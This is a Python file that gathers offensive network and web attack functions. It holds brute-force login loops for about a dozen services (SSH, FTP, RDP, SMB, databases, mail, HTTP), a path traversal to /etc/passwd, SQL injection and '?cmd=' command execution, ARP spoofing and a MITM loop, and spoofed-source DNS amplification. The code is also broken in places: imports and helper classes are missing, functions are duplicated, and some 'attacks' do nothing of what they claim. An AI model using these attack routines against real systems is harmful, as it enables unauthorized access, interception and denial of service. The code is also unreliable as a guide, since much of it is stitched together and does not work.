import ftplib
import paramiko
import base64
import requests
import mysql.connector
import psycopg2
import pymongo
import redis

def ftpbrutelogin(hostname, passwdFile):
    try:
        pF = open(passwdFile, "r")
    except:
        print("[!!] File does not exist!")

    for line in pF.readlines():
        try:
            username = line.split(":")[0]
            password = line.split(":")[1].strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            ftp = ftplib.FTP(hostname)
            login = ftp.login(username, password)
            print("\nSuccess! We logged in using: %s:%s" % (username, password))
            ftp.quit()
            print("\n", "\t"*2, "#"*75, "\n")
        except:
            print("[-] Username and password not found!!")
            print("\n", "\t"*2, "#"*75, "\n")


def scan_port(hostname, start_port, end_port):
    open_ports = []
    for port in range(start_port, end_port+1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = s.connect_ex((hostname, port))
            if result == 0:
                open_ports.append(port)
                print("[+] Port %d is open" % port)
            s.close()
        except socket.error:
            print("[-] Could not connect to %s" % hostname)
    return open_ports


def dns_lookup(hostname):
    try:
        ip = socket.gethostbyname(hostname)
        print("[+] The IP address of %s is %s" % (hostname, ip))
    except socket.error:
        print("[-] Could not resolve hostname: %s" % hostname)


def banner_grabbing(hostname, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((hostname, port))
        s.settimeout(2)
        banner = s.recv(1024).decode().strip()
        print("[+] Banner: %s" % banner)
        s.close()
    except socket.error:
        print("[-] Could not connect to %s:%d" % (hostname, port))


def directory_traversal(url):
    try:
        response = requests.get(url + "/../../../../../../../../../../../etc/passwd")
        print("[+] Response:\n%s" % response.text)
    except requests.exceptions.RequestException:
        print("[-] Error occurred during directory traversal")


def sql_injection(url, payload):
    try:
        response = requests.get(url + "' OR 1=1 -- -")
        if payload in response.text:
            print("[+] SQL Injection successful")
        else:
            print("[-] SQL Injection failed")
    except requests.exceptions.RequestException:
        print("[-] Error occurred during SQL injection")


def xss_vulnerability(url):
    try:
        response = requests.get(url)
        if "<script>" in response.text:
            print("[-] XSS vulnerability detected")
        else:
            print("[+] No XSS vulnerability found")
    except requests.exceptions.RequestException:
        print("[-] Error occurred during XSS vulnerability check")


def remote_code_execution(url, command):
    try:
        response = requests.get(url + "?cmd=" + command)
        print("[+] Response:\n%s" % response.text)
    except requests.exceptions.RequestException:
        print("[-] Error occurred during remote code execution")


def brute_force_ssh(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(hostname, port=22, username=username, password=password)
                print("\nSuccess! We logged in using: %s:%s" % (username, password))
                client.close()
                print("\n", "\t"*2, "#"*75, "\n")
            except paramiko.AuthenticationException:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def sniff_packets(interface):
    try:
        sniff(iface=interface, prn=lambda x: x.summary())
    except:
        print("[-] Error occurred during packet sniffing")


def arp_spoof(target_ip, gateway_ip, interface):
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        send(packet, verbose=0)
        print("[+] ARP spoofing packets sent")
    except:
        print("[-] Error occurred during ARP spoofing")


def ssl_stripping():
    try:
        subprocess.call("sslstrip")
        print("[+] SSL stripping attack started")
    except:
        print("[-] Error occurred during SSL stripping")


def wireless_password_cracking(interface, pcap_file, wordlist):
    try:
        subprocess.call(["airmon-ng", "start", interface])
        subprocess.call(["aircrack-ng", "-w", wordlist, pcap_file])
    except:
        print("[-] Error occurred during wireless password cracking")


def mitm_attack(target_ip, gateway_ip, interface):
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        spoof_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        spoof_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

        print("[+] Sending ARP packets for MITM attack")
        while True:
            send(spoof_target)
            send(spoof_gateway)
            time.sleep(2)

    except:
        print("[-] Error occurred during MITM attack")


def web_application_scanning(url):
    try:
        scanner = WebScanner(url)
        vulnerabilities = scanner.scan()
        if vulnerabilities:
            print("[+] Found vulnerabilities:")
            for vulnerability in vulnerabilities:
                print(" - %s" % vulnerability)
        else:
            print("[+] No vulnerabilities found")
    except:
        print("[-] Error occurred during web application scanning")


def dns_poisoning(target_ip, dns_server_ip):
    try:
        packet = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="www.example.com"))
        send(packet)
        print("[+] DNS poisoning packets sent")
    except:
        print("[-] Error occurred during DNS poisoning")


def brute_force_web_authentication(url, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            data = {
                "username": username,
                "password": password
            }
            response = requests.post(url, data=data)
            if response.status_code == 200:
                print("\nSuccess! Authenticated using: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
            else:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def bluetooth_sniffing():
    try:
        subprocess.call(["btmon"])
        print("[+] Bluetooth sniffing started")
    except:
        print("[-] Error occurred during Bluetooth sniffing")


def brute_force_ftp(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            ftp = ftplib.FTP(hostname)
            try:
                ftp.login(username, password)
                print("\nSuccess! We logged in using: %s:%s" % (username, password))
                ftp.quit()
                print("\n", "\t"*2, "#"*75, "\n")
            except ftplib.error_perm:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def dns_rebinding_attack(target_url, malicious_ip):
    try:
        response = requests.get(target_url)
        html_content = response.text

        rebinded_html = html_content.replace("127.0.0.1", malicious_ip)

        with open("rebinded.html", "w") as f:
            f.write(rebinded_html)

        print("[+] DNS rebinding attack performed successfully")
    except:
        print("[-] Error occurred during DNS rebinding attack")


def wpa2_cracking(pcap_file, wordlist):
    try:
        subprocess.call(["aircrack-ng", "-w", wordlist, pcap_file])
    except:
        print("[-] Error occurred during WPA2 cracking")


def brute_force_ssh_private_key(hostname, username, private_key_file):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for key_filename in private_key_file:
            try:
                private_key = paramiko.RSAKey.from_private_key_file(key_filename)
                client.connect(hostname, port=22, username=username, pkey=private_key)
                print("[+] Successfully authenticated using private key: %s" % key_filename)
                client.close()
                break
            except paramiko.AuthenticationException:
                print("[-] Authentication failed using private key: %s" % key_filename)
    except:
        print("[-] Error occurred during SSH private key authentication")


def dns_amplification_attack(target_ip, dns_server_ip, domain):
    try:
        packet = IP(src=target_ip, dst=dns_server_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype='ALL'))
        send(packet)
        print("[+] DNS amplification attack packets sent")
    except:
        print("[-] Error occurred during DNS amplification attack")



def port_knocking(hostname, ports):
    try:
        for port in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((hostname, port))
            if result == 0:
                print("[+] Port %d is open" % port)
            s.close()
            time.sleep(1)
        print("[+] Port knocking completed")
    except socket.error:
        print("[-] Could not connect to %s" % hostname)


def brute_force_mysql(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                conn = pymysql.connect(host=hostname, user=username, passwd=password)
                print("\nSuccess! Connected to MySQL using: %s:%s" % (username, password))
                conn.close()
                print("\n", "\t"*2, "#"*75, "\n")
            except pymysql.err.OperationalError:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def csrf_attack(target_url, malicious_site):
    try:
        session = requests.Session()
        response = session.get(target_url)
        csrf_token = re.search(r'<input[^>]+name="csrf_token"[^>]+value="([^"]+)"', response.text).group(1)
        payload = {
            "csrf_token": csrf_token,
            "data": "Malicious data"
        }
        headers = {
            "Referer": malicious_site
        }
        response = session.post(target_url, data=payload, headers=headers)
        if response.status_code == 200:
            print("[+] CSRF attack successful")
        else:
            print("[-] CSRF attack failed")
    except:
        print("[-] Error occurred during CSRF attack")


def dns_spoofing(target_url, spoofed_ip):
    try:
        dns = DNSCache()
        dns.add_mapping(target_url, spoofed_ip)
        dns.start_spoofing()
        print("[+] DNS spoofing attack started")
    except:
        print("[-] Error occurred during DNS spoofing")


def brute_force_telnet(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                tn = telnetlib.Telnet(hostname)
                tn.read_until(b"login: ")
                tn.write(username.encode('ascii') + b"\n")
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
                result = tn.read_some()
                if b"incorrect" not in result:
                    print("\nSuccess! Logged in using: %s:%s" % (username, password))
                    tn.write(b"exit\n")
                    print("\n", "\t"*2, "#"*75, "\n")
                else:
                    print("[-] Authentication failed for: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
            except:
                print("[-] Error occurred during Telnet connection")
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def dns_cache_poisoning(target_url, spoofed_ip):
    try:
        dns = DNSCache()
        dns.add_mapping(target_url, spoofed_ip)
        dns.start_cache_poisoning()
        print("[+] DNS cache poisoning attack started")
    except:
        print("[-] Error occurred during DNS cache poisoning")


def sql_injection_attack(url, payload):
    try:
        response = requests.get(url + payload)
        if "Error" in response.text:
            print("[+] SQL injection attack successful")
        else:
            print("[-] SQL injection attack failed")
    except:
        print("[-] Error occurred during SQL injection attack")


def brute_force_pop3(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                server = poplib.POP3(hostname)
                server.user(username)
                server.pass_(password)
                print("\nSuccess! Logged in using: %s:%s" % (username, password))
                server.quit()
                print("\n", "\t"*2, "#"*75, "\n")
            except poplib.error_proto:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_smtp(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                server = smtplib.SMTP(hostname)
                server.login(username, password)
                print("\nSuccess! Logged in using: %s:%s" % (username, password))
                server.quit()
                print("\n", "\t"*2, "#"*75, "\n")
            except smtplib.SMTPAuthenticationError:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_vnc(hostname, password_file):
    try:
        pF = open(password_file, "r")
    except:
        print("[!!] File does not exist!")

    for password in pF.readlines():
        password = password.strip("\n")
        print("[+] Trying password: %s" % password)
        try:
            vnc = VncAuth(hostname, password)
            if vnc.authenticate():
                print("\nSuccess! Authenticated using password: %s" % password)
                print("\n", "\t"*2, "#"*75, "\n")
                break
            else:
                print("[-] Authentication failed for password: %s" % password)
                print("\n", "\t"*2, "#"*75, "\n")
        except:
            print("[-] Error occurred during VNC connection")
            print("\n", "\t"*2, "#"*75, "\n")
    pF.close()


def arp_spoofing(target_ip, gateway_ip):
    try:
        arp = ARP()
        arp.poison(target_ip, gateway_ip)
        print("[+] ARP spoofing attack started")
    except:
        print("[-] Error occurred during ARP spoofing")


def brute_force_ldap(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                ldap.set_option(ldap.OPT_REFERRALS, 0)
                conn = ldap.initialize(hostname)
                conn.simple_bind_s(username, password)
                print("\nSuccess! Authenticated using: %s:%s" % (username, password))
                conn.unbind_s()
                print("\n", "\t"*2, "#"*75, "\n")
            except ldap.INVALID_CREDENTIALS:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_rdp(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                rdp = RDPClient(hostname, username, password)
                if rdp.authenticate():
                    print("\nSuccess! Authenticated using: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
                    break
                else:
                    print("[-] Authentication failed for: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
            except:
                print("[-] Error occurred during RDP connection")
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_smb(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                smb = SMBClient(hostname, username, password)
                if smb.authenticate():
                    print("\nSuccess! Authenticated using: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
                    break
                else:
                    print("[-] Authentication failed for: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
            except:
                print("[-] Error occurred during SMB connection")
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_ssh(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname, username=username, password=password, timeout=5)
                print("\nSuccess! Authenticated using: %s:%s" % (username, password))
                ssh.close()
                print("\n", "\t"*2, "#"*75, "\n")
            except paramiko.AuthenticationException:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
            except paramiko.SSHException:
                print("[-] Error occurred during SSH connection")
                print("\n", "\t"*2, "#"*75, "\n")
            except socket.error:
                print("[-] Error occurred during SSH connection")
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_ftp(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                print("\nSuccess! Logged in using: %s:%s" % (username, password))
                ftp.quit()
                print("\n", "\t"*2, "#"*75, "\n")
            except ftplib.error_perm:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
            except ftplib.error_reply:
                print("[-] Error occurred during FTP connection")
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_http_basic_auth(url, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                headers = {"Authorization": "Basic " + base64.b64encode(f"{username}:{password}".encode("utf-8")).decode("utf-8")}
                response = requests.get(url, headers=headers)
                if response.status_code == 200:
                    print("\nSuccess! Authenticated using: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
                else:
                    print("[-] Authentication failed for: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
            except:
                print("[-] Error occurred during HTTP connection")
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_http_form(url, username_field, password_field, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                session = requests.Session()
                login_data = {username_field: username, password_field: password}
                response = session.post(url, data=login_data)
                if "logout" in response.text:
                    print("\nSuccess! Authenticated using: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
                else:
                    print("[-] Authentication failed for: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
            except:
                print("[-] Error occurred during HTTP connection")
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_mysql(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                conn = mysql.connector.connect(
                    host=hostname,
                    user=username,
                    password=password
                )
                if conn.is_connected():
                    print("\nSuccess! Authenticated using: %s:%s" % (username, password))
                    conn.close()
                    print("\n", "\t"*2, "#"*75, "\n")
                else:
                    print("[-] Authentication failed for: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
            except mysql.connector.Error as e:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_postgres(hostname, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                conn = psycopg2.connect(
                    host=hostname,
                    user=username,
                    password=password
                )
                if conn.status == psycopg2.extensions.STATUS_READY:
                    print("\nSuccess! Authenticated using: %s:%s" % (username, password))
                    conn.close()
                    print("\n", "\t"*2, "#"*75, "\n")
                else:
                    print("[-] Authentication failed for: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
            except psycopg2.OperationalError as e:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()


def brute_force_mongodb(hostname, port, username_file, password_file):
    try:
        uF = open(username_file, "r")
        pF = open(password_file, "r")
    except:
        print("[!!] Files do not exist!")

    for username in uF.readlines():
        username = username.strip("\n")
        for password in pF.readlines():
            password = password.strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            try:
                client = pymongo.MongoClient(hostname, port)
                client.admin.authenticate(username, password, mechanism='SCRAM-SHA-256')
                if "ok" in client.admin.command("ping"):
                    print("\nSuccess! Authenticated using: %s:%s" % (username, password))
                    client.close()
                    print("\n", "\t"*2, "#"*75, "\n")
                else:
                    print("[-] Authentication failed for: %s:%s" % (username, password))
                    print("\n", "\t"*2, "#"*75, "\n")
            except pymongo.errors.OperationFailure as e:
                print("[-] Authentication failed for: %s:%s" % (username, password))
                print("\n", "\t"*2, "#"*75, "\n")
            except pymongo.errors.ServerSelectionTimeoutError as e:
                print("[-] Error occurred during MongoDB connection")
                print("\n", "\t"*2, "#"*75, "\n")
    uF.close()
    pF.close()

